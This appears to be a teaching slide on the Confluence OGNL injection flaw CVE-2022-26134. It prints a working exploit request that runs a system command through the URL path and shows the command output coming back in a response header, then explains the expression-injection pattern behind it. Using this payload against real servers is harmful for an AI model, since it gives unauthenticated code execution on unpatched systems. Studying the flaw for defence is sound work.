Real world — CVE-2022-26134 (Confluence)

Atlassian Confluence Server / Data Center Unauthenticated OGNL injection in URL paths. CVSS 9.8. Active in-the-wild exploitation within 24h of disclosure (June 2022).

the request — OGNL right in the URL

Host: confluence.victim.tld

GET /${(#a=@org.apache.commons.io.IOUtils@toString(
        @java.lang.Runtime@getRuntime().exec("id").getInputStream())).
       (@com.opensymphony.webwork.ServletActionContext@getResponse().setHeader("X-Out",#a))}/ HTTP/1.1

# response:
HTTP/1.1 302
X-Out: uid=1000(confluence) gid=1000 groups=1000

Why it's SSTI The URL path was being passed through OGNL evaluation — the same expression language used in legitimate templates — without proper context separation. ${...} in the path got executed.

Pattern, not an outlier Spring4Shell (CVE-2022-22965), Atlassian Crowd, Liferay, ColdFusion — same shape: user input reaches an expression-language evaluator.
